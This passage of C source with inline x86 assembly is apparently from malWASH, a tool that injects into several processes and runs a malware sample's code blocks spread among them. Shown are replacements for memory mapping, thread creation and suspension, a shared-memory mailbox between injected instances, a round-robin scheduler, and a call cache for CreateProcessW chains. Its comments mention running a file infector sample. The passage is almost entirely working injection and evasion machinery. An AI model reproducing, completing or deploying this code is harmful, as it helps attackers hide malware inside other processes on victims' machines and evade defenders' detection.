			retn										// return
	}
	//-------------------------------------------------------------------------------------------------------
	// freemem(): As you can imagine this function deallocates a heap chunk. And inform the other processes
	//	to do the same. Because we have shared regions, all processes must be detach from them.
	//
	// Arguments (fastcall): ecx (void*) : a pointer to the shared region that needs to be freed
	//
	// Return Value: No matter an error occured or not, function returns 1.
	//
	// NOTE: Upon success, functions HeapFree() and VirtualFree() return 1, while LocalFree() and 
	//	 GlobalFree() return NULL (0). free() is void. We decide to return 1 (although it's possible to cause
	//	 problem if the user is doing error checking on Local/GlobalFree()
	//-------------------------------------------------------------------------------------------------------
	__asm {
		// this pseudo-function is used to find function address at runtime 
		get_freemem_addr:								//
			B(0xe8) D(0x00, 0x00, 0x00, 0x00)			// call next instruction
			pop		eax									// get current address
			add		eax, 0x05							// add a small offset to go to the function below
			retn										// return
		// --------------------------------------------------------------------------
		// freemem() function prolog
		// --------------------------------------------------------------------------
		freemem:										//
			push	ebp									// we're going to modify ebp
			push	edx									// backup register that you're going to use
			push	ebx									//
			push	esi									//
			push	edi									//
			sub		esp, 0x10							// create a stack frame
														//
			call	get_noebp_local_storage_esi			// locate local storage
														// get main's ebp, to access local vars
			mov		ebp, dword ptr ds:[esi + noebp_origebp]
			mov		ebx, dword ptr ds:[esi + noebp_pid]	//
			mov		[esp + 4], ebx						// v4 = pid
			mov		[esp + 8], ecx						// v8 = address to free
			// --------------------------------------------------------------------------
			// do the actual free (remember that we have an open handle)
			// --------------------------------------------------------------------------
			push	ecx									// address to release
			call	[UnmapViewOfFile]					// detach from shared memory & ignore errors
			// --------------------------------------------------------------------------
			// now send mail to each process
			// (you'll see an ugly code repetition from crtdusock here :( ...)
			// --------------------------------------------------------------------------
			mov		esi, [loctrl]						// esi = &loctrl
			lea		edi, [esi + MAILBOXOFF]				// edi = loctrl->mailbox
			movzx	ecx, word ptr[esi + NPROCOFF]		// ecx = loctrl->nproc
			add		esi, PIDTABOFF						// esi = loctrl->pidtab
														//
		freemem_loop:									//
			mov		ebx, [esi + ecx*4 - 4]				// ebx = loctrl->pidtab[ecx - 1]
			test	ebx, ebx							// DEBUG ONLY: if it's NULL, don't duplicate
			jz		freemem_skip						// (pid's are sequential, so we can't have NULLs)
			cmp		ebx, [esp + 0x4]					// compare pid with your pid
			jz		freemem_skip						// don't write on your own mailbox!
			// --------------------------------------------------------------------------
			// send message to every pid through mailbox
			// --------------------------------------------------------------------------
			mov		[esp + 0xc], ecx					// backup ecx
			lea		edx, [ecx - 1]						// off by one to ecx
			shl		edx, 13								// each mailbox entry is 1024 bytes * 8 mails
			// --------------------------------------------------------------------------
			// search for an empty slot in mailbox. If it's full, don't send the mail
			// --------------------------------------------------------------------------
			mov		ecx, MAXMAILBOXSIZE					// maximum number of slots
														//
		freemem_find_empty_mail_slot:					//
			cmp		word ptr[edi + edx], 0x0000			// is slot filled?
			je		freemem_empty_mail_slot_found		// if not break
			add		edx, MAILBOXSIZE					// otherwise, move on the next mail slot
			loop	freemem_find_empty_mail_slot		// continue search
														// if you reach this point, all slots are filled
			jmp		freemem_cleanup						// so, do not send
														//
		freemem_empty_mail_slot_found:					// send message to mailbox
			mov		word ptr[edi + edx], CMD_FREEMEM	// loctrl->mailbox[ecx-1].cmd = CMD_FREEMEM
			mov		eax, [esp + 8]						// eax = address to free
			mov		dword ptr[edi + edx + 8], eax		// loctrl->mailbox[ecx-1].reserved2[0] = address to free
														//
			mov		ecx, [esp + 0xc]					// restore ecx
		freemem_skip:									//
			loop	freemem_loop						// get next entry	
		// --------------------------------------------------------------------------
		// freemem() function epilog
		// --------------------------------------------------------------------------
		freemem_cleanup:								//
			add		esp, 0x10							// release stack frame
			pop		edi									//	restore registers
			pop		esi									//
			pop		ebx									//
			pop		edx									//
			pop		ebp									// restore ebp
			retn										// return
	}
	//-------------------------------------------------------------------------------------------------------
	// mapmem(): Map a file to a shared region. This not a heap operation, but we handle it in a similar way.
	//	We allocate some space (as we're doing with alloc() but instead of having this region uninitialized,
	//	we map the contents of an object whose handle is specified at edx register.
	//
	// Arguments (fastcall): ecx (size_t) : The memory size that needs to be allocated
	//                       edx (HANDLE) : A handle to a mapping object
	//
	// Return Value: Fuction returns the value that MapViewOfFileEx() returns: If no errors occured, the
	//	return value will be the base address of the mapped object. Otherwise a NULL is returned.
	//
	// NOTE: Upon success, functions HeapFree() and VirtualFree() return 1, while LocalFree() and 
	//	 GlobalFree() return NULL (0). free() is void. We decide to return 1 (although it's possible to cause
	//	 problem if the user is doing error checking on Local/GlobalFree()
	//-------------------------------------------------------------------------------------------------------
	__asm {
		// this pseudo-function is used to find function address at runtime 
		get_mapmem_addr:								//
			B(0xe8) D(0x00, 0x00, 0x00, 0x00)			// call next instruction
			pop		eax									// get current address
			add		eax, 0x05							// add a small offset to go to the function below
			retn										// return
			// --------------------------------------------------------------------------
			// mapmem() function prolog
			// --------------------------------------------------------------------------
		mapmem:											//
 			push	ebp									// we're going to modify ebp
			push	ebx									// backup register that you're going to use
			push	esi									//
			push	edi									//
			sub		esp, 0x20							// create a stack frame
			call	get_noebp_local_storage_esi			// locate local storage
														// get main's ebp, to access local vars
			mov		ebp, dword ptr ds:[esi + noebp_origebp]
			mov		[esp + 0x08], ecx					// backup size
			mov		[esp + 0x14], edx					// backup HANDLE
			push	dword ptr ds:[esi + noebp_pid]		// push n pop pid
			pop		dword ptr[esp + 0x1c]				// note that first we pop and then we store
														// so the offset is 0x1c even though we pushed a value
			// --------------------------------------------------------------------------
			// first find the duplicated handle
			// --------------------------------------------------------------------------
			mov		edx, eax							// get original handle
			call	locduphdl							// search for duplicated
			mov		edx, eax							// set duplicated handle
			// ------------------------------------------------------------------------------------
			// first allocate some space in the shared heap
			//
			// FIX: We have a problem here: Mapping a file in memory is a 2-part process in Windows. 
			// First we call CreateFileMapping() to create the mapping object and then MapViewOfFileEx() 
			// to do the actual map. Both functions take an argument which specifies the required 
			// permissions. Now, if CreateFileMapping() has fewer permissions than MapViewOfFileEx(), 
			// the last will fail. Here we only mmap R+W regions. If we want a clear solution, we
			// must read the permissions from CreateFileMapping (by adding a hook to it and read the
			// right argument) and then use these permissions to do the MapViewOfFileEx(). Also when
			// we inform the other processes about memory mapping we also have to supply them these
			// permissions.
			// ------------------------------------------------------------------------------------
			mov		esi, [loctrl]						// esi = &loctrl
			push	[esi + NXTHEAPADDROFF]				// lpBaseAddress: loctrl->nxtheapaddr
			push	ecx									// dwNumberOfBytesToMap: arg1
			push	0									// dwFileOffsetLow: 0
			push	0									// dwFileOffsetHigh: 0
			push	0x2									// dwDesiredAccess: FILE_MAP_WRITE
			push	edx									// hFileMappingObject: hMapFile
			call	[MapViewOfFileEx]					// MapViewOfFileEx()
			mov		[esp + 0x4], eax					// backup address that needs to be returned
			test	eax, eax							// NULL returned?
			jz		mapmem_cleanup						// if so return error (eax is already clear)
			// --------------------------------------------------------------------------
			// update next heap address (& align it to 64KB)
			// -------------------------------------------------------------------------
			mov		esi, [loctrl]						//
			mov		ecx, [esp + 0x8]					// restore memory size
			mov		edi, [esi + NXTHEAPADDROFF]			// esi = loctrl->nxtheapaddr 
			lea		edx, [edi + ecx + 0x10000]			// make esi point to the end of the allocated memory
			and		edx, 0xffff0000						// align to 64KB
			mov		[esi + NXTHEAPADDROFF], edx			// update next heap address
			// --------------------------------------------------------------------------
			// now send mail to each process
			// (you'll see an ugly code repetition from crtdusock here :( ...)
			// --------------------------------------------------------------------------
			lea		edi, [esi + MAILBOXOFF]				// edi = loctrl->mailbox
			movzx	ecx, word ptr[esi + NPROCOFF]		// ecx = loctrl->nproc
			add		esi, PIDTABOFF						// esi = loctrl->pidtab
			mov		[esp + 0x0c], esi					// backup loctrl->pidtab
			mov		[esp + 0x10], edi					// backup loctrl->mailbox
														//
		mapmem_loop:									//
			mov		ebx, [esi + ecx*4 - 4]				// ebx = loctrl->pidtab[ecx - 1]
			test	ebx, ebx							// DEBUG ONLY: if it's NULL, don't duplicate
			jz		mapmem_skip							// (pid's are sequential, so we can't have NULLs)
			cmp		ebx, [esp + 0x1c]					// compare pid with your pid
			jz		mapmem_skip							// don't write on your own mailbox!
			// --------------------------------------------------------------------------
			// send message to every pid through mailbox
			// --------------------------------------------------------------------------
			mov		[esp + 0x18], ecx					// backup ecx
			lea		edx, [ecx - 1]						// off by one to ecx
			shl		edx, 13								// each mailbox entry is 1024 bytes * 8 mails
			// --------------------------------------------------------------------------
			// search for an empty slot in mailbox. If it's full, don't send the mail
			// --------------------------------------------------------------------------
			mov		ecx, MAXMAILBOXSIZE					// maximum number of slots
														//
		mapmem_find_empty_mail_slot:					//
			cmp		word ptr[edi + edx], 0x0000			// is slot filled?
			je		mapmem_empty_mail_slot_found		// if not break
			add		edx, MAILBOXSIZE					// otherwise, move on the next mail slot
			loop	mapmem_find_empty_mail_slot			// continue search
														// if you reach this point, all slots are filled
			jmp		mapmem_cleanup						// so, do not send
														//
		mapmem_empty_mail_slot_found:					// send message to mailbox
			mov		word ptr[edi + edx], CMD_MAPMEM		// loctrl->mailbox[ecx-1].cmd = CMD_MAPMEM
			mov		eax, [esp + 0x14]					// get HANDLE
			mov		dword ptr[edi + edx + 0x4], eax		// loctrl->mailbox[ecx-1].handle = HANDLE
			mov		eax, [esp + 0x04]					// get desired address
			mov		dword ptr[edi + edx + 0x8], eax		// loctrl->mailbox[ecx-1].reserved2[0] = base address
			mov		eax, [esp + 0x08]					// get size
			mov		dword ptr[edi + edx + 0xc], eax		// loctrl->mailbox[ecx-1].reserved2[1] = size
														// 
			mov		ecx, [esp + 0x18]					// restore ecx
		mapmem_skip:									//
			mov		esi, [esp + 0x0c]					// restore esi 
			mov		edi, [esp + 0x10]					// edi = loctrl->mailbox
			loop	mapmem_loop							// get next entry														
			// --------------------------------------------------------------------------
			// mapmem() function epilog
			// --------------------------------------------------------------------------
			mov		eax, [esp + 4]						// get addreess of allocated memory
		mapmem_cleanup:									//
			add		esp, 0x20							// release stack frame
			pop		edi									//	restore registers
			pop		esi									//
			pop		ebx									//
			pop		ebp									// restore ebp
			retn										// return
	}
	//-------------------------------------------------------------------------------------------------------
	// freenrwdmem(): This function releases a shared heap object and moves global heap pointer back. The 
	//	reason I created this function is because file infector sample maps and unmaps the same file twice.
	//  If the 2nd map happens in different address program will crash. Thus we replace UnmapViewOfFile() 
	//  with this function to solve this problem. Once more, if we implement a real heap manipulation module
	//	we won't have this problem.
	//
	// Arguments (stdcall): lpBaseAddress (void*) : Address to free
	//
	// Return Value: Whatever freemem() returns.
	//-------------------------------------------------------------------------------------------------------
	__asm {
		// this pseudo-function is used to find function address at runtime 
		get_freenrwdmem_addr:							//
			B(0xe8) D(0x00, 0x00, 0x00, 0x00)			// call next instruction
			pop		eax									// get current address
			add		eax, 0x05							// add a small offset to go to the function below
			retn										// return
			// --------------------------------------------------------------------------
			// freenrwdmem() function prolog
			// -------------------------------------------------------------------------
		freenrwdmem:									//
			push	ebp									// we're going to modify ebp
			push	esi									//
			call	get_noebp_local_storage_esi			// locate local storage
			mov		ebp,dword ptr ds:[esi+noebp_origebp]// get main's ebp, to access local vars
			// --------------------------------------------------------------------------
			// update next heap address (& align it to 64KB)
			// -------------------------------------------------------------------------
			mov		esi, [loctrl]						// esi = &loctrl
			mov		eax, [esp + 0x8 + 0x8]				// get arg1 + 2 push
			mov		[esi + NXTHEAPADDROFF], eax			// update next heap address
			call	freemem								// free shared memory
			// --------------------------------------------------------------------------
			// freenrwdmem() function epilog
			// -------------------------------------------------------------------------
			pop		esi									//
			pop		ebp									// restore ebp
			retn										// return 
	}
	//-------------------------------------------------------------------------------------------------------


// * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * //
// ++===================================================================================================++ //
// ||                        M U L T I - T H R E A D I N G   M A N A G E M E N T                        || //
// ++===================================================================================================++ //
//
// So, what can we do with multithreading malware? As you can imagine thinks start getting complex here.
// However our totally distributed design allows us to extend it to multi-threading. Instead of having a
// single variable nxtblk, we have an array with 1 entry per thread. We also have a mini scheduler that 
// executes a block from each thread in a round-robin flavor.
//
// We also have to replace all thread functions. For example, ExitThread() only needs to alter some data
// on thread tables, and not do exit any "real" thread (otherwise ExitThread() will close malWASH).
//
// ++===================================================================================================++ //
// * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * //

	//-------------------------------------------------------------------------------------------------------
	// resched(): This is our mini scheduler. This function can be as complex as real schedulers in OS, or
	//		as here which is as simple as possible. Let's start by defining the problem: Assume that we have
	//		a multi-threading malware with 3 threads. Each thread has its own stack and its own context. 2
	//		tables (nxtblk and sem) are responsible for synchronizing threads and malWASH instances. sem 
	//		table has 1 entry per thread and contains a semaphore for each thread. nxtblk has also 1 entry
	//		per block and shows the next block for each thread (if a thread reaches the end -through a 
	//		return- the next block will be -1). Let's see an instance:
	//             +--------------+---------------+---------------+---------------+
	//      nxtblk |      68      |      151      |       16      |       -1      |
	//             +--------------+---------------+---------------+---------------+
	//      sem    |  0x000004c8  |  0x000004cc   |  0x000004d0   |  0x000004d4   |
	//             +--------------+---------------+---------------+---------------+
	//      state  |    LOCKED    |    LOCKED     |   UNLOCKED    |   UNLOCKED    | -> not a real table
	//             +--------------+---------------+---------------+---------------+
	//      thrdst |   RUNNING    |    RUNNING    |   SUSPENDED   |    UNUSED     |
	//             +--------------+---------------+---------------+---------------+
	//		
	//		Thread #3 is not used (or it has finished execution; in any case we ignore it), where threads
	//		#0, #1 and #2 are currently executing blocks 68, 151 and 16 respectively. Things can be really
	//		messy here. malWASH is injecting in (let's say) 8 processes and emulating a malware with 3 
	//		threads. At each time only 1 malWASH instance is allowed to execute 1 block from each thread.
	//		Meanwhile different instances are allowed to execute blocks from different threads. So what
	//		can we do?
	//
	//		Our scheduler has some invariants:
	//			[1]. Scheduling algorithm is round-robin (it's simple and works really well in real
	//				 schedulers).
	//			[2]. All threads are equal. There are no priorities assigned to threads (oh yeah, we
	//				 can give priorities to threads, but really, there's no point).
	//			[3]. If an instance attempts to execute a block from a thread that is already executing by
	//				 an another instance, it will block. This is inefficient though. A better approach is
	//				 to check if it's locked and if so, to move on the next thread. If all threads are 
	//				 locked, we can either spin around table, or remember the last semaphore that we had 
	//				 blocked at the next semaphore.
	//				 (if you call WaitForSingleObject() with 2nd argument =0 you can immediately check whether 
	//				 semaphore is locked or not).
	//
	//		Because the maximum number of threads is small (currently NMAXTHREADS = 4) we don't keep a guard
	//		value that has the table limits. Thus, even with 1 thread, we iterate the whole table. I know, 
	//		it's stupid.
	//
	//		In our previous example we work as follows: Assume that nxtblk = 0. At first we increment nxtblk.
	//		Then we check nxtblk[1]. This thread is in running state, as shown by thrdst[1], so we attempt to 
	//		lock the semaphore. It's locked, so we'll block until the other instance release it. When this 
	//		happens we'll execute the next block (not block 151) of thread #1. After executing it, we'll go 
	//		back and check thread #2. However thrdst[2] = SUSPENDED, so we skip it. Then we go to thread #3,
	//		where thrdst[3] = UNUSED, so we also skip it. Then we rewind to thread #0, which is also locked. 
	//		We'll lock at thread #0, and so on...
	//
	//
	//		* * *                                     * * *
	//		* * *  WARNING: RACE CONDITION DANGER!!!  * * *
	//		* * *                                     * * *
	//
	//		From the time that we check whether a thread is running, to the time that we successfully take
	//		the semaphore, it's possible to invoke windows scheduler. If the new malWASH instance execute
	//		a block from the same thread that will either call ExitThread() or normally return, then when 
	//		we get the CPU back and we hold the thread's semaphore, we'll end up trying to execute a block 
	//		from thread that is not active anymore. Note that we cannot have exclusive access from the time
	//		to check thrdst to the time that we get the semaphore and thus we cannot add a semaphore before
	//		we check thrdst. If we do that a deadlock is obvious :P. We avoid solutions with spinlocks
	//		because we already have a significant performance impact.
	//		
	//		However we know, once we get the semaphore we have exclusive access to thrdst. Thus we can
	//		safely check again if current is still active. If not we call again resched(), in order to
	//		get a new thread. Otherwise we can progress the execution of the current thread.
	//
	//
	// Arguments: None.
	//
	// Return Value: If function iterates the whole table without finding any valid bid, function returns -1.
	//		Otherwise function returns 0.
	//-------------------------------------------------------------------------------------------------------
	__asm {
		resched:										// our mini-scheduler :)
			xor		edi, edi							// clear our counter
		resched_internal_loop:							//
			inc		edi									// 
			cmp		edi, NMAXTHREADS					// ++edi > NMAXTHREADS ?
			jg		resched_error						// if yes, jump to error
			// --------------------------------------------------------------------------
			// First increase nxtthrd in a circular flavor (round robin)
			// --------------------------------------------------------------------------
			mov		ebx, [nxtthrd]						// ebx = nxtthrd
			inc		ebx									// 
			cmp		ebx, NMAXTHREADS					// ++ebx < NMAXTHREADS ?
			jl		resched_dont_clear_nxtthrd			// if yes, don't clear it
			xor		ebx, ebx							// ebx = 0
		resched_dont_clear_nxtthrd:						//
			mov		[nxtthrd], ebx						// nxtthrd = 0
			// --------------------------------------------------------------------------
			// Then check if this thread has a valid block id (is it used?)
			// --------------------------------------------------------------------------
			mov		edx, [loctrl]						// edx = loctrl
			mov		ax, word ptr[edx+ebx*2 + THRDSTOFF]	// eax = loctrl->thrdst[nxtthrd]
			cmp		ax, THREAD_RUNNING					// if it's not in RUNNING state, skip it
			jne		resched_internal_loop				//
			// --------------------------------------------------------------------------
			// Finally block on the "right" semaphore
			// * * * WARNING: Race condition!
			// --------------------------------------------------------------------------
		resched_sem_lock:
			push    0xffffffff							// arg2: dwMilliseconds (INFINITE)
			lea		edx, [sem]							// address of semaphore array
			push	[edx + ebx*4]						// arg1: hHandle (remember: ebx = nxtthrd)
			call	[WaitForSingleObject]				// wait on semaphore
			// --------------------------------------------------------------------------
			// Now we can execute next block of the next thread. But we have to check
			// again if current thread is still active
			// --------------------------------------------------------------------------
			mov		edx, [loctrl]						// edx = loctrl
			mov		ax, word ptr[edx+ebx*2 + THRDSTOFF]	// eax = loctrl->thrdst[nxtthrd]
			cmp		ax, THREAD_RUNNING					// if it's not in RUNNING state, skip it
			je		resched_done						//
			// --------------------------------------------------------------------------
			// release semaphore first
			// --------------------------------------------------------------------------
			push	0									// arg3: lpPreviousCount (NULL)
			push	1									// arg2: lReleaseCount (++)
			lea		ebx, [sem]							// address of semaphore array
			mov		ecx, [nxtthrd]						// get next thread id
			push	[ebx + ecx*4]						// arg1: hHandle
			call	[ReleaseSemaphore]					// release semaphore
			// --------------------------------------------------------------------------
			// and invoke resched() again
			// --------------------------------------------------------------------------
			xor		edi, edi							// clear counter
			jmp		resched_internal_loop				// call resched()
		resched_done:									//
			mov		eax, SUCCESS						// return success
			retn										//
		resched_error:									//
			mov		eax, _ERROR							// return error
			retn										//
	}
	//-------------------------------------------------------------------------------------------------------
	// createthread(): CreateThread() replacement. All you have to do is to change thrdst to RUNNING.
	//
	// Arguments: LPSECURITY_ATTRIBUTES  lpThreadAttributes, 
	//            SIZE_T                 dwStackSize, 
	//	          LPTHREAD_START_ROUTINE lpStartAddress, 
	//            LPVOID                 lpParameter, 
	//            DWORD                  dwCreationFlags, 
	//            LPDWORD                lpThreadId
	//
	// Remarks: we set lpThreadId and return value to the index in the thread table where 
	//		thrdrtn[i] == lpStartAddress.
	//
	// Return Value: A HANDLE to the newly created thread. If we can't find the address in the thrdrtn table,
	//		the return value is NULL.
	//-------------------------------------------------------------------------------------------------------
	__asm {
		// this pseudo-function is used to find function address at runtime 
		get_createthread_addr:							//
			B(0xe8) D(0x00, 0x00, 0x00, 0x00)			// call next instruction
			pop		eax									// get current address
			add		eax, 0x05							// add a small offset to go to the function below
			retn										// return
			// --------------------------------------------------------------------------
			// createthread() function prolog
			// -------------------------------------------------------------------------
		createthread:									//
			push	ebp									// backup registers that you're going to use
			push	edx									//
			push	ecx									//
			push	esi									//
			lea		edx, [esp + 0x14]					// edx = the beginning of the arguments
			call	get_noebp_local_storage_esi			// locate local storage
														// get main's ebp, to access local vars
			mov		ebp, dword ptr ds:[esi + noebp_origebp]
			// --------------------------------------------------------------------------
			// search through thrdrtn for the lpStartAddress
			// --------------------------------------------------------------------------
			mov		ecx, NMAXTHREADS					// for each slot
			dec		ecx									// (we skip the 1st slot which is for main thread)
		createthread_rtn_loop:							//
			mov		esi, [loctrl]						// esi = &loctrl
			mov		esi, [esi + THRDRTNOFF + ecx*4]		// esi = loctrl->thrdrtn[i]
			cmp		esi, [edx + 0x8]					// loctrl->thrdrtn[i] == lpStartAddress ?
			je		createthread_rtn_found				// if yes break
			loop	createthread_rtn_loop				// get next slot
			xor		eax, eax							// we have an error, return NULL
			jmp		createthread_end					// go to the end
			// --------------------------------------------------------------------------
			// change thread's state and set lpThreadId 
			// --------------------------------------------------------------------------
		createthread_rtn_found:							// ecx has the thread id
			mov		esi, [loctrl]						// esi = &loctrl
														// loctrl->thrdst[i] = THREAD_RUNNING
			mov		word ptr[esi + THRDSTOFF + ecx*2], THREAD_RUNNING			
			mov		eax, ecx							// return thread index as handle
			// --------------------------------------------------------------------------
			// copy argument to thread's stack
			// --------------------------------------------------------------------------
			push	edx									// backup registers
			push	ecx									//
														//
			mov		edx, [edx + 0xc]					// get lpParameter
			imul	ecx, ecx, CTXLEN					// get thread's context
			lea		esi, [esi + ecx + CTXOFF+CTXOFF_ESP]// esui = loctrl->ctx[thrd].esp
			mov		[esi + 4], edx						// *(esp + 4) = lpParameter
														//
			pop		ecx									// restore registers
			pop		edx									//
														//
			mov		edx, [edx + 0x14]					// get address of lpThreadId
			test	edx, edx							// lpThreadId can be NULL
			je		createthread_end					// if it's NULL don't return thread id
			mov		[edx], ecx							// set thread id
			// --------------------------------------------------------------------------
			// createthread() function epilog
			// -------------------------------------------------------------------------
		createthread_end:								//
			pop		esi									// restore registers
			pop		ecx									//
			pop		edx									//
			pop		ebp									//
			retn 24										// return (don't forget its stdcall!)
	}
	//-------------------------------------------------------------------------------------------------------
	// exitthread(): ExitThread() replacement. All you have to do is to set thrdst to UNUSED.
	//
	// Arguments: DWORD  dwExitCode
	//
	// Return Value: None.
	//-------------------------------------------------------------------------------------------------------
	__asm {
		// this pseudo-function is used to find function address at runtime 
		get_exitthread_addr:							//
			B(0xe8) D(0x00, 0x00, 0x00, 0x00)			// call next instruction
			pop		eax									// get current address
			add		eax, 0x05							// add a small offset to go to the function below
			retn										// return
			// --------------------------------------------------------------------------
			// exitthread() function prolog
			// -------------------------------------------------------------------------
		exitthread:										//
			push	ebp									// backup registers that you're going to use
			push	esi									//
			push	edi									//
			call	get_noebp_local_storage_esi			// locate local storage
														// get main's ebp, to access local vars
			mov		ebp, dword ptr ds:[esi + noebp_origebp]
			mov		esi, [loctrl]						// esi = &loctrl
			mov		edi, [nxtthrd]						// current thread has nxtthrd id
														// loctrl->thrdrtn[nxtthrd] = THREAD_UNUSED
			mov		[esi + THRDSTOFF + edi*2], THREAD_UNUSED
			// --------------------------------------------------------------------------
			// exitthread() function epilog
			// -------------------------------------------------------------------------
			pop		edi									// restore registers
			pop		esi									//
			pop		ebp									//
			retn										// return
	}
	//-------------------------------------------------------------------------------------------------------
	// suspendthread(): CreateThread() replacement. All you have to do is to set thrdst to SUSPENDED.
	//
	// Arguments: HANDLE hThread
	//
	// Remarks: Illegal HANLDE values, will end up in arbitrary memory writes
	//
	// Return Value: Function always return 0.
	//-------------------------------------------------------------------------------------------------------
	__asm {
		// this pseudo-function is used to find function address at runtime 
		get_suspendthread_addr:							//
			B(0xe8) D(0x00, 0x00, 0x00, 0x00)			// call next instruction
			pop		eax									// get current address
			add		eax, 0x05							// add a small offset to go to the function below
			retn										// return
			// --------------------------------------------------------------------------
			// suspendthread() function prolog
			// -------------------------------------------------------------------------
		suspendthread:									//
			push	ebp									// backup registers that you're going to use
			push	esi									//
			push	edi									//
			call	get_noebp_local_storage_esi			// locate local storage
														// get main's ebp, to access local vars
			mov		ebp, dword ptr ds:[esi + noebp_origebp]
			mov		esi, [loctrl]						// esi = &loctrl
			mov		edi, [esp + 0x10]					// 3 pushed register + return value to reach argument
														// loctrl->thrdrtn[hThread] = THREAD_SUSPENDED
			mov		[esi + THRDSTOFF + edi*2], THREAD_SUSPENDED
			// --------------------------------------------------------------------------
			// suspendthread() function epilog
			// -------------------------------------------------------------------------
			pop		edi									// restore registers
			pop		esi									//
			pop		ebp									//
			xor		eax, eax							// return 0
			retn 4										// return (don't forget its stdcall!)
	}
	//-------------------------------------------------------------------------------------------------------
	// resumethread(): CreateThread() replacement. All you have to do is to set thrdst to RUNNING.
	//
	// Arguments: HANDLE hThread
	//
	// Remarks: Illegal HANLDE values, will end up in arbitrary memory writes
	//
	// Return Value: Function always return 0.
	//-------------------------------------------------------------------------------------------------------
	__asm {
		// this pseudo-function is used to find function address at runtime 
		get_resumethread_addr:							//
			B(0xe8) D(0x00, 0x00, 0x00, 0x00)			// call next instruction
			pop		eax									// get current address
			add		eax, 0x05							// add a small offset to go to the function below
			retn										// return
			// --------------------------------------------------------------------------
			// resumethread() function prolog
			// -------------------------------------------------------------------------
		resumethread:									//
			push	ebp									// backup registers that you're going to use
			push	esi									//
			push	edi									//
			call	get_noebp_local_storage_esi			// locate local storage
														// get main's ebp, to access local vars
			mov		ebp, dword ptr ds:[esi + noebp_origebp]
			mov		esi, [loctrl]						// esi = &loctrl
			mov		edi, [esp + 0x10]					// 3 pushed register + return value to reach argument
														// loctrl->thrdrtn[hThread] = THREAD_RUNNING
			mov		[esi + THRDSTOFF + edi*2], THREAD_RUNNING
			// --------------------------------------------------------------------------
			// resumethread() function epilog
			// -------------------------------------------------------------------------
			pop		edi									// restore registers
			pop		esi									//
			pop		ebp									//
			xor		eax, eax							// return 0
			retn 4										// return (don't forget its stdcall!)
	}
	//-------------------------------------------------------------------------------------------------------


// * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * //
// ++===================================================================================================++ //
// ||                                        C A L L   C A C H E                                        || //
// ++===================================================================================================++ //
//
// Call cache is a dirty trick to solve function dependecies. There are some functions that return data
// which are process-specific. If we attempt to use these data in a different address space, the result 
// will be a beautiful segmentation fault. One example is CreateProcessW() followed by GetStartupInfoW().
// GetStartupInfoW() will fill structure with process specific information. If we execute CreateProcessW()
// under a different process, this structure will be invalid, and CreateProcess will crash.
// 
// The idea is to force the same process to execute all functions that have dependencies. Let's assume
// that we have a chain of processes that have a dependency. Instead of calling a function we put its
// address and its arguments in call cache. This is a PUSH operation and the calling function is a push
// function. Every function in this chain is simply put in the call cache, and we return a success status
// code to the original malware.
//
// The last function of the chain is going to execute ALL functions with their argument from call cache,
// and then call "itself". This is a SWEEP operation. During a SWEEP operation, the call cache flushes.
//
// Some things here are inherently wrong. What if a function in the chain fail? Here we assume that is
// successfull and we return a success status code when we insert it in the call cache. However if this
// function fail during sweep, the original program will believe that the last function of the chain had
// failed. This is not totally correct, but as long as no errors occur, everything is fine.
//
// So, where we store call cache? We use the bottom of the stack, and we push arguments in reverse order.
// This means that we have a normal stack (the reverse of the reverse is straight :P).
//
// WARNING: This method may not work under any dependence or under any piece of code.
//
// ++===================================================================================================++ //
// * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * //

	//-------------------------------------------------------------------------------------------------------
	// getstartupinfo_push(): GetStartupInfoW() replacement. According to its documentation it "retrieves the 
	//	"contents of the STARTUPINFO structure that was specified when the calling process was created".
	//	This means that when this function is invoked, the STARTUPINFO structure is returned, is created
	//	based on the current process. If we call later CreateProcessW() and give this object as an argument,
	//	CreateProcessW() will crash. Thus we have a dependecy: GetStartupInfoW -> CreateProcessW. Thus, 
	//	GetStartupInfoW is the "push" replacement. However if CreateProcessW won't be called later, we'll 
	//	have problems. Let's assume for now that CreateProcessW always called :)
	//
	//	Let's see the STARTUPINFO object and it's most important fields:
	//		typedef struct _STARTUPINFO {
	//		  DWORD  cb;
	//		  LPTSTR lpReserved;
	//		  LPTSTR lpDesktop;
	//		  LPTSTR lpTitle;
	//		  DWORD  dwX;
	//		  DWORD  dwY;
	//		  DWORD  dwXSize;
	//		  DWORD  dwYSize;
	//		  DWORD  dwXCountChars;
	//		  DWORD  dwYCountChars;
	//		  DWORD  dwFillAttribute;
	//		  DWORD  dwFlags;					--> Offset 0x2c
	//		  WORD   wShowWindow;				--> Offset 0x30
	//		  WORD   cbReserved2;
	//		  LPBYTE lpReserved2;
	//		  HANDLE hStdInput;					--> Offset 0x38
	//		  HANDLE hStdOutput;				--> Offset 0x3c
	//		  HANDLE hStdError;					--> Offset 0x40
	//		} STARTUPINFO, *LPSTARTUPINFO;
	//
	//	Note here that we have 3 HANDLEs. This means that if we want to pass this object as an argument
	//	we have to replace these 3 HANDLEs. Such implicit argument passing of HANDLE is very hard to
	//	detect :\
	//
	//	NOTE: We only consider UNICODE version here
	// Arguments: lpStartupInfo (LPSTARTUPINFO) : A pointer that receives the startup information.
	//
	// Return Value: None.
	//-------------------------------------------------------------------------------------------------------
	__asm {
		// this pseudo-function is used to find function address at runtime 
		get_getstartupinfo_push_addr:					//
			B(0xe8) D(0x00, 0x00, 0x00, 0x00)			// call next instruction
			pop		eax									// get current address
			add		eax, 0x05							// add a small offset to go to the function below
			retn										// return
			// --------------------------------------------------------------------------
			// getstartupinfo_push() function prolog
			// -------------------------------------------------------------------------
		getstartupinfo_push:							//
			mov		eax, STACKBASEADDR2					// use bottom of stack to stack to store call cache
			mov		dword ptr[eax], ebx					// get a backup of ebx
			mov		ebx, eax							//
			call	get_noebp_local_storage_eax			// get local storage
			mov		ebx,ds:[eax + noebp_GetStartupInfoW]// get address of GetStartupInfoW()
														//
			mov		eax, STACKBASEADDR2					// get call cache entry point
			mov		[eax + 4], ebx						// store function's address
			mov		ebx, [esp + 0x4]					//
			mov		[eax + 8], ebx						// and its argument (LPSTARTUPINFO)
			mov		ebx, dword ptr[eax]					// restore ebx
			xor		eax, eax							// it's void, but it's good to return 0
			retn 0x4 									// return and pop the argument
	}	
